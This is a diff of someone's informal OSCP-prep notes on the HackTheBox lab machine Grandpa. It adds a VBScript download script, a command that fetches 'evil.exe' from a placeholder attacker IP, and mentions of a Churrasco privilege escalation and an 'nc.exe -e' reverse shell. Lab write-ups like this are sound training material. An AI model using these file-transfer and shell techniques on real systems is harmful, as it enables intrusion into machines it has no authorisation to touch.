@@ -6,7 +6,9 @@ Goals:  OSCP Prep
 Learnt:
 - Old HTB boxes are weird
 - I am sick weird old boxes  
-- Need I too frantic
+- Need I pause too frantic
+- XP go for vb script
+- VM for Python2 feels bad before hand and then it feels great
 
 ## Recon
 
@@ -46,9 +48,50 @@ https://python.readthedocs.io/en/v2.7.2/library/httplib.html is renameed to http
 
 I got a shell on the box, but I know would I run into the same issues, but I got metasploit issues. I know the metasploit exploit works, just not the privesc. I will finish this later a bit more calmly.
 
-## Foothold
+## Foothold && PrivEsc   
 
-## PrivEsc      
-https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html
+![](wmpubperm.png)
+[0xdf](https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html) also struggled and used [Churrasco](https://github.com/Re4son/Churrasco/)
 
-https://github.com/Re4son/Churrasco/
+## Windows-File-transferVBS-script
+XP and 2003 lifesaver, from the OSCP course
+BEWARE: "If creating on Linux and then transfer to windows then you may face issue sometime, use unix2dos before you transfer it in this case." 
+Hakluke.
+```vb
+# wget.bs
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+```
+Run with:
+```powershell
+cscript wget.vbs http://attackerip/evil.exe evil.exe
+```
+
+![](churrasco.png)
+
+I tried the same nc.exe -e, because I have also never actually done that from Windows
+
+![](system.png)
